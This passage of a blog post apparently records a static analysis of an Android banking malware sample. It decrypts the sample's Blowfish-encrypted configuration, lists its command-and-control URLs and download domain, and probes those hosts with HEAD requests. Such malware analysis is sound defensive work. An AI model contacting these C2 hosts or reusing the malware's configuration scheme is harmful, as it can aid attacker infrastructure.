</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">v6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">com</span><span class="p">.</span><span class="na">gmail</span><span class="p">.</span><span class="na">xlibs</span><span class="p">.</span><span class="na">Blowfish</span><span class="p">.</span><span class="na">byte2hex</span><span class="p">(</span><span class="n">v5</span><span class="p">.</span><span class="na">getBytes</span><span class="p">()).</span><span class="na">substring</span><span class="p">(</span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">50</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><code>p10</code> is the 2nd argument given to getRawData. If you pay attention you may notice that if <code>p10</code> == 1 nothing special will happen. Otherwise (content of blfs.key is read out) there are some string manipulations taking place. This took me a while to notice it and was the reason I couldn&rsquo;t decrypt the config.cfg. This is what it does with the content of <code>blfs.key</code>:</p>
<ul>
<li>convert string to byte array</li>
<li>convert byte array to hex string</li>
<li>take only the first 50 bytes</li>
</ul>
<p>In the end <code>v6</code> will contain the decryption key. Using <a href="https://www.dlitz.net/software/pycrypto/">PyCrypto</a> we&rsquo;ll try to decrypt the content in Python:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from Crypto.Cipher import Blowfish
</span></span><span class="line"><span class="cl">from Crypto import Random
</span></span><span class="line"><span class="cl">from struct import pack
</span></span><span class="line"><span class="cl">from binascii import hexlify, unhexlify
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># Read content from files
</span></span><span class="line"><span class="cl">blfs_key = !cat output/res/raw/blfs.key
</span></span><span class="line"><span class="cl">ciphertext_base64 = !cat output/res/raw/config.cfg
</span></span><span class="line"><span class="cl">ciphertext_raw = ciphertext_base64[0].decode(&#34;base64&#34;)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># Some settings
</span></span><span class="line"><span class="cl">IV = &#34;12345678&#34;
</span></span><span class="line"><span class="cl">_KEY = blfs_key[0]
</span></span><span class="line"><span class="cl">ciphertext = ciphertext_raw
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># As seen in the source code: 
</span></span><span class="line"><span class="cl">#  * hex-encode the blfs key
</span></span><span class="line"><span class="cl">#  * take only the substring[0:50]
</span></span><span class="line"><span class="cl">KEY = hexlify(_KEY)[:50]
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># Do the decryption
</span></span><span class="line"><span class="cl">cipher = Blowfish.new(KEY, Blowfish.MODE_CBC, IV)
</span></span><span class="line"><span class="cl">message = cipher.decrypt(ciphertext)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">message
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>'&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;\n          &lt;config&gt;\n            &lt;data rid=&quot;25&quot; \n                  shnum10=&quot;&quot; shtext10=&quot;&quot; shnum5=&quot;&quot; shtext5=&quot;&quot; shnum3=&quot;&quot; shtext3=&quot;&quot; shnum1=&quot;&quot; shtext1=&quot;&quot; \n                  del_dev=&quot;0&quot; \n                  url_main=&quot;http://best-invest-int.com/gallery/3.php;http://citroen-club.ch/images/3.php&quot; \n                  url_data=&quot;http://best-invest-int.com/gallery/1.php;http://citroen-club.ch/images/1.php&quot; \n                  url_sms=&quot;http://best-invest-int.com/gallery/2.php;http://citroen-club.ch/images/2.php&quot;\n                  url_log=&quot;http://best-invest-int.com/gallery/4.php;http://citroen-club.ch/images/4.php&quot;\n                  download_domain=&quot;certificates-security.com&quot;\n                  ready_to_bind=&quot;0&quot; /&gt;\n            \n          &lt;/config&gt;\x05\x05\x05\x05\x05'
</code></pre>
<p>Yeay! Now a more structured look at the XML:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from lxml import etree
</span></span><span class="line"><span class="cl">import xml.etree.ElementTree as ET
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># Remove dirty characters
</span></span><span class="line"><span class="cl">xml = message.replace(&#34;\x05&#34;, &#34;&#34;).replace(&#34;\n&#34;, &#34;&#34;)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># Create XML tree from string
</span></span><span class="line"><span class="cl">root = etree.XML(xml)
</span></span><span class="line"><span class="cl">data = root.xpath(&#34;/config//data&#34;)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">frame = []
</span></span><span class="line"><span class="cl"># Get data
</span></span><span class="line"><span class="cl">for sample in data:
</span></span><span class="line"><span class="cl">    for attr_name, attr_value in sample.items():
</span></span><span class="line"><span class="cl">        values = attr_value.split(&#34;;&#34;)
</span></span><span class="line"><span class="cl">        for v in values:
</span></span><span class="line"><span class="cl">            frame.append((attr_name, v))
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># Show attributes found in /config/data
</span></span><span class="line"><span class="cl">df = pd.DataFrame(frame, columns=[&#39;Attribute&#39;, &#39;Value&#39;])
</span></span><span class="line"><span class="cl">df
</span></span></code></pre></td></tr></table>
</div>
</div><div style="max-height:1000px;max-width:1500px;overflow:auto;">
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>Attribute</th>
      <th>Value</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0 </th>
      <td>             rid</td>
      <td>                                       25</td>
    </tr>
    <tr>
      <th>1 </th>
      <td>         shnum10</td>
      <td>                                         </td>
    </tr>
    <tr>
      <th>2 </th>
      <td>        shtext10</td>
      <td>                                         </td>
    </tr>
    <tr>
      <th>3 </th>
      <td>          shnum5</td>
      <td>                                         </td>
    </tr>
    <tr>
      <th>4 </th>
      <td>         shtext5</td>
      <td>                                         </td>
    </tr>
    <tr>
      <th>5 </th>
      <td>          shnum3</td>
      <td>                                         </td>
    </tr>
    <tr>
      <th>6 </th>
      <td>         shtext3</td>
      <td>                                         </td>
    </tr>
    <tr>
      <th>7 </th>
      <td>          shnum1</td>
      <td>                                         </td>
    </tr>
    <tr>
      <th>8 </th>
      <td>         shtext1</td>
      <td>                                         </td>
    </tr>
    <tr>
      <th>9 </th>
      <td>         del_dev</td>
      <td>                                        0</td>
    </tr>
    <tr>
      <th>10</th>
      <td>        url_main</td>
      <td> http://best-invest-int.com/gallery/3.php</td>
    </tr>
    <tr>
      <th>11</th>
      <td>        url_main</td>
      <td>      http://citroen-club.ch/images/3.php</td>
    </tr>
    <tr>
      <th>12</th>
      <td>        url_data</td>
      <td> http://best-invest-int.com/gallery/1.php</td>
    </tr>
    <tr>
      <th>13</th>
      <td>        url_data</td>
      <td>      http://citroen-club.ch/images/1.php</td>
    </tr>
    <tr>
      <th>14</th>
      <td>         url_sms</td>
      <td> http://best-invest-int.com/gallery/2.php</td>
    </tr>
    <tr>
      <th>15</th>
      <td>         url_sms</td>
      <td>      http://citroen-club.ch/images/2.php</td>
    </tr>
    <tr>
      <th>16</th>
      <td>         url_log</td>
      <td> http://best-invest-int.com/gallery/4.php</td>
    </tr>
    <tr>
      <th>17</th>
      <td>         url_log</td>
      <td>      http://citroen-club.ch/images/4.php</td>
    </tr>
    <tr>
      <th>18</th>
      <td> download_domain</td>
      <td>                certificates-security.com</td>
    </tr>
    <tr>
      <th>19</th>
      <td>   ready_to_bind</td>
      <td>                                        0</td>
    </tr>
  </tbody>
</table>
</div>
<h2 id="inspect-malwares-config">Inspect malwares config</h2>
<p>Looks interesting. Are those URLs still available?</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import urllib2
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"># Get URLs from DataFrame (only the valid ones)
</span></span><span class="line"><span class="cl">urls = df[&#39;Value&#39;][10:19].tolist()
</span></span><span class="line"><span class="cl">#urls = [&#34;http://google.de/&#34;, &#34;http://blog.dornea.nu/about&#34;]
</span></span><span class="line"><span class="cl">resp = {}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">def get_status_code(host, path=&#34;/&#34;):
</span></span><span class="line"><span class="cl">    &#34;&#34;&#34; This function retreives the status code of a website by requesting
</span></span><span class="line"><span class="cl">        HEAD data from the host. This means that it only requests the headers.
</span></span><span class="line"><span class="cl">        If the host cannot be reached or something else goes wrong, it returns
</span></span><span class="line"><span class="cl">        None instead.
</span></span><span class="line"><span class="cl">    &#34;&#34;&#34;
</span></span><span class="line"><span class="cl">    try:
</span></span><span class="line"><span class="cl">        conn = httplib.HTTPConnection(host)
</span></span><span class="line"><span class="cl">        conn.request(&#34;HEAD&#34;, path)
</span></span><span class="line"><span class="cl">        return conn.getresponse().getheaders()
</span></span><span class="line"><span class="cl">    except StandardError:
</span></span><span class="line"><span class="cl">        return None
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># Iterate through URLs
</span></span><span class="line"><span class="cl">for u in urls:
</span></span><span class="line"><span class="cl">    p = &#39;(?:http.*://)?(?P&lt;host&gt;[^:/ ]+).?(?P&lt;port&gt;[0-9]*)/(?P&lt;path&gt;.*)&#39;
</span></span><span class="line"><span class="cl">    m = re.search(p, u)
</span></span><span class="line"><span class="cl">    if m:
</span></span><span class="line"><span class="cl">        status_code = get_status_code(m.group(&#39;host&#39;), &#34;/&#34; + m.group(&#39;path&#39;))
</span></span><span class="line"><span class="cl">        resp[u] = status_code
</span></span><span class="line"><span class="cl">resp
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>{'http://best-invest-int.com/gallery/1.php': None,
 'http://best-invest-int.com/gallery/2.php': None,
 'http://best-invest-int.com/gallery/3.php': None,
 'http://best-invest-int.com/gallery/4.php': None,
 'http://citroen-club.ch/images/1.php': [('date',
   'Fri, 04 Jul 2014 08:31:12 GMT'),
  ('content-type', 'text/html; charset=iso-8859-1'),
  ('server', 'Apache')],
 'http://citroen-club.ch/images/2.php': [('date',
   'Fri, 04 Jul 2014 08:31:12 GMT'),
  ('content-type', 'text/html; charset=iso-8859-1'),
  ('server', 'Apache')],
 'http://citroen-club.ch/images/3.php': [('date',
   'Fri, 04 Jul 2014 08:31:11 GMT'),
  ('content-type', 'text/html; charset=iso-8859-1'),
  ('server', 'Apache')],
 'http://citroen-club.ch/images/4.php': [('date',
   'Fri, 04 Jul 2014 08:31:12 GMT'),
  ('content-type', 'text/html; charset=iso-8859-1'),
  ('server', 'Apache')]}
</code></pre>
<p>Hmmm.. Nothing special. The servers might have been patched meanwhile against this malware. I hope we&rsquo;re going to see more when doing the dynamic analysis.</p>
<h2 id="control-flow-graph-cfg">Control Flow Graph (CFG)</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">%%bash
</span></span><span class="line"><span class="cl">mkdir DEX
</span></span><span class="line"><span class="cl">cp 7276e76298c50d2ee78271cf5114a176 DEX
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> DEX
</span></span><span class="line"><span class="cl">unzip 7276e76298c50d2ee78271cf5114a176
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ..
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>Archive:  7276e76298c50d2ee78271cf5114a176
signed by SignApk
  inflating: META-INF/MANIFEST.MF    
  inflating: META-INF/CERT.SF        
  inflating: META-INF/CERT.RSA       
  inflating: AndroidManifest.xml     
  inflating: classes.dex             
 extracting: res/drawable-hdpi/ic_launcher1.png  
 extracting: res/drawable-hdpi/logo.png  
 extracting: res/drawable-ldpi/ic_launcher1.png  
 extracting: res/drawable-mdpi/ic_launcher1.png  
 extracting: res/drawable-xhdpi/ic_launcher1.png  
  inflating: res/layout/actup.xml    
  inflating: res/layout/main.xml     
  inflating: res/layout/main2.xml    
  inflating: res/menu/main.xml       
 extracting: res/raw/blfs.key        
  inflating: res/raw/config.cfg      
  inflating: resources.arsc          
</code></pre>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">import hashlib
</span></span><span class="line"><span class="cl">import StringIO, pydot
</span></span><span class="line"><span class="cl">from IPython.display import Image
</span></span><span class="line"><span class="cl">from androguard.core.bytecodes.dvm import *
</span></span><span class="line"><span class="cl">from androguard.core.analysis.analysis import VMAnalysis
</span></span><span class="line"><span class="cl">from androguard.core.bytecode import method2dot, method2format, method2png
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">d = DalvikVMFormat(open(&#34;DEX/classes.dex&#34;).read())
</span></span><span class="line"><span class="cl">x = VMAnalysis(d)
</span></span><span class="line"><span class="cl">d.set_vmanalysis(x)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># Utilities
</span></span><span class="line"><span class="cl">def create_graph(data, output):
</span></span><span class="line"><span class="cl">    # Stolen from androguard/core/bytecode.py
</span></span><span class="line"><span class="cl">    buff = &#34;digraph {\n&#34;
</span></span><span class="line"><span class="cl">    buff += &#34;graph [rankdir=TB]\n&#34;
</span></span><span class="line"><span class="cl">    buff += &#34;node [shape=plaintext]\n&#34;
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    # subgraphs cluster
</span></span><span class="line"><span class="cl">    buff += &#34;subgraph cluster_&#34; + hashlib.md5(output).hexdigest() + &#34; {\nlabel=\&#34;%s\&#34;\n&#34; % data[&#39;name&#39;]
</span></span><span class="line"><span class="cl">    buff += data[&#39;nodes&#39;]
</span></span><span class="line"><span class="cl">    buff += &#34;}\n&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    # subgraphs edges
</span></span><span class="line"><span class="cl">    buff += data[&#39;edges&#39;]
</span></span><span class="line"><span class="cl">    buff += &#34;}\n&#34;
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    graph = pydot.graph_from_dot_data(buff)
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    return graph
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="comgmailxlibsmyfunctions-getfirst">com.gmail.xlibs.myFunctions: getFirst()</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># Definition:  d.get_method_descriptor(self, class_name, method_name, descriptor)
</span></span><span class="line"><span class="cl"># 
</span></span><span class="line"><span class="cl"># Examples for method descriptors:
</span></span><span class="line"><span class="cl">#   R 62 Lcom/gmail/xlibs/myFunctions;-&gt;getFirst (Landroid/content/Context;)V
</span></span><span class="line"><span class="cl">#   R 17c Lcom/gmail/xlibs/myFunctions;-&gt;getFirst (Landroid/content/Context;)V
</span></span><span class="line"><span class="cl">#   R e8 Lcom/gmail/xlibs/myFunctions;-&gt;getSecond (Landroid/content/Context;)V
</span></span><span class="line"><span class="cl">#   R 0 Lcom/gmail/xlibs/myFunctions;-&gt;setK12 (Ljava/lang/String; Landroid/content/Context;)Ljava/lang/String;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">m = d.get_method_descriptor(&#34;Lcom/gmail/xlibs/myFunctions;&#34;, &#34;getFirst&#34;, &#34;(Landroid/content/Context;)V&#34;)
</span></span><span class="line"><span class="cl">buff_dot = method2dot(x.get_method(m))
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">graph = create_graph(buff_dot, &#34;png&#34;)
</span></span><span class="line"><span class="cl">Image(graph.create_png())
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blog.dornea.nu/posts/img/2014/disect-android-apks-like-a-pro-sca/output_79_0.png" alt="png"></p>
<h3 id="comgmailxlibsmyfunctions-getsecond">com.gmail.xlibs.myFunctions: getSecond()</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">m = d.get_method_descriptor(&#34;Lcom/gmail/xlibs/myFunctions;&#34;, &#34;getSecond&#34;, &#34;(Landroid/content/Context;)V&#34;)
</span></span><span class="line"><span class="cl">buff_dot = method2dot(x.get_method(m))
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">graph = create_graph(buff_dot, &#34;png&#34;)
</span></span><span class="line"><span class="cl">Image(graph.create_png())
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blog.dornea.nu/posts/img/2014/disect-android-apks-like-a-pro-sca/output_81_0.png" alt="png"></p>
<h3 id="comgmailxservices-xrepeat">com.gmail.xservices: XRepeat</h3>
<p><code>getFirst</code> and <code>getSecond</code> are both called from the class <code>com.gmail.xservices.XRepeat</code> in the method <code>doInBackground</code>. Let&rsquo;s search for the appropriate <em>method descriptor</em>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># We should have a list of PathP objects which represent where a specific method is called:
</span></span><span class="line"><span class="cl">paths = x.tainted_packages.search_methods(&#34;.&#34;, &#34;onReceive&#34;, &#34;.&#34;)
</span></span><span class="line"><span class="cl">paths
</span></span></code></pre></td></tr></table>
</div>
</div><pre><code>[&lt;androguard.core.analysis.analysis.PathP instance at 0x101a5290&gt;]
</code></pre>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># Get the class manager from the VM
</span></span><span class="line"><span class="cl">cm = d.get_class_manager()
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">src = []
</span></span><span class="line"><span class="cl">dst = []
</span></span><span class="line"><span class="cl"># Iterate through paths
</span></span><span class="line"><span class="cl">for p in paths:
</span></span><span class="line"><span class="cl">    src.append(p.get_src(cm))
</span></span><span class="line"><span class="cl">    dst.append(p.get_dst(cm))
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">df_src = pd.DataFrame(src, columns=[&#39;From&#39;, &#39;Method&#39;, &#39;Type&#39;])
</span></span><span class="line"><span class="cl">df_dst = pd.DataFrame(dst, columns=[&#39;To&#39;, &#39;Method&#39;, &#39;Type&#39;])
</span></span><span class="line"><span class="cl">display_html(df_src)
</span></span><span class="line"><span class="cl">display_html(df_dst)
</span></span></code></pre></td></tr></table>
</div>
</div><div style="max-height:1000px;max-width:1500px;overflow:auto;">
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>From</th>
      <th>Method</th>
      <th>Type</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0</th>
      <td> Landroid/support/v4/content/LocalBroadcastMana...</td>
      <td> executePendingBroadcasts</td>
      <td> ()V</td>
    </tr>
  </tbody>
</table>
</div>
<div style="max-height:1000px;max-width:1500px;overflow:auto;">
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>To</th>
      <th>Method</th>
      <th>Type</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0</th>
      <td> Landroid/content/BroadcastReceiver;</td>
      <td> onReceive</td>
      <td> (Landroid/content/Context; Landroid/content/In...</td>
    </tr>
  </tbody>
</table>
</div>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">m = d.get_method_descriptor(&#34;Lcom/gmail/xservices/XRepeat;&#34;, &#34;onReceive&#34;, &#34;(Landroid/content/Context; Landroid/content/Intent;)V&#34;)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">buff_dot = method2dot(x.get_method(m))
</span></span><span class="line"><span class="cl">graph = create_graph(buff_dot, &#34;png&#34;)
</span></span><span class="line"><span class="cl">Image(graph.create_png())
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blog.dornea.nu/posts/img/2014/disect-android-apks-like-a-pro-sca/output_86_0.png" alt="png"></p>
<h2 id="conclusion">Conclusion</h2>
<p>I&rsquo;ve found cool new ways how to analyze an APK using python tools. <strong>AndroGuard</strong> seems to be a quite good framework to work it. Although I&rsquo;ve managed it to get <em>almost</em> everything working, I must say that the project itself (and its components!) aren&rsquo;t well documented. Then I had several errors like this one:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># ~/work/bin/androguard/androdd.py -i FakeBanker.apk -f PNG -o neu</span>
</span></span><span class="line"><span class="cl">Dump information FakeBanker.apk in neu
</span></span><span class="line"><span class="cl">Clean directory neu
</span></span><span class="line"><span class="cl">Analysis ... End
</span></span><span class="line"><span class="cl">Decompilation ... End
</span></span><span class="line"><span class="cl">ERROR: module pydot not found
</span></span><span class="line"><span class="cl">Dump Landroid/support/v4/app/FragmentManager<span class="p">;</span> &lt;init&gt; <span class="o">()</span>V ... PNG ...
</span></span><span class="line"><span class="cl">Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
</span></span><span class="line"><span class="cl">  File <span class="s2">&#34;/root/work/bin/androguard/androdd.py&#34;</span>, line 222, in &lt;module&gt;
</span></span><span class="line"><span class="cl">    main<span class="o">(</span>options, arguments<span class="o">)</span>
</span></span><span class="line"><span class="cl">  File <span class="s2">&#34;/root/work/bin/androguard/androdd.py&#34;</span>, line 207, in main~~~~
</span></span><span class="line"><span class="cl">    export_apps_to_format<span class="o">(</span>options.input, a, options.output, options.limit, options.jar, options.decompiler, options.format<span class="o">)</span>
</span></span><span class="line"><span class="cl">  File <span class="s2">&#34;/root/work/bin/androguard/androdd.py&#34;</span>, line 180, in export_apps_to_format
</span></span><span class="line"><span class="cl">    method2format<span class="o">(</span>filename + <span class="s2">&#34;.&#34;</span> + format, format, None, buff<span class="o">)</span>
</span></span><span class="line"><span class="cl">  File <span class="s2">&#34;/root/work/bin/androguard/androguard/core/bytecode.py&#34;</span>, line 338, in method2format
</span></span><span class="line"><span class="cl">    error<span class="o">(</span><span class="s2">&#34;module pydot not found&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">  File <span class="s2">&#34;/root/work/bin/androguard/androguard/core/androconf.py&#34;</span>, line 270, in error
</span></span><span class="line"><span class="cl">    raise<span class="o">()</span>
</span></span><span class="line"><span class="cl">TypeError: exceptions must be old-style classes or derived from BaseException, not tuple
</span></span></code></pre></td></tr></table>
</div>
</div><p>But I don&rsquo;t want to complain about the project. In fact I think its the most comprehensive tool bundle out there for analytical purposes. If you know better alternatives just let me know about it. In the <strong>next part</strong> I&rsquo;ll be writing about <strong>dynamic code analysis</strong>. So stay tuned :)</p>

    

  </div>
  <div id="comments">
      

  </div>
</main>
 






<div class="tl fixed list-pages lh-copy" id="contents-list"></div>



<div class="pagination tc tr-l db fixed-l bottom-2-l right-2-l mb3 mb0-l">
  
<a id="scroll-to-top" class="f6 o-0 link br2 ph2 pv1 mb1 bg-main-color pointer" onclick="topFunction()" style="color: #fff; visibility: hidden; display: none; transition: opacity .5s, visibility .5s;" title="back to top">back to top</a>
<br>
  <p class="mb0 mt2">
  <a href="https://blog.dornea.nu/2014/07/01/on-java-openssl-crypto-blowfish-and-stuff/">prev</a>
  <a href="https://blog.dornea.nu/2014/08/05/android-dynamic-code-analysis-mastering-droidbox/">next</a>
  </p>
</div>

  <footer class="content-width mt0 mt5-l mb4 f6 center ph3 gray tc tl-l">
  <hr class="dn db-l ml0-l gray w3"><br>
  Powered by <a href="https://gohugo.io/" target="_blank" class="link gray dim">Hugo</a>, based on the <a href="https://github.com/lingxz/er" target="_blank" class="link gray dim">Er</a> theme.
  2009-2024 Victor Dorneanu - All rights reserved
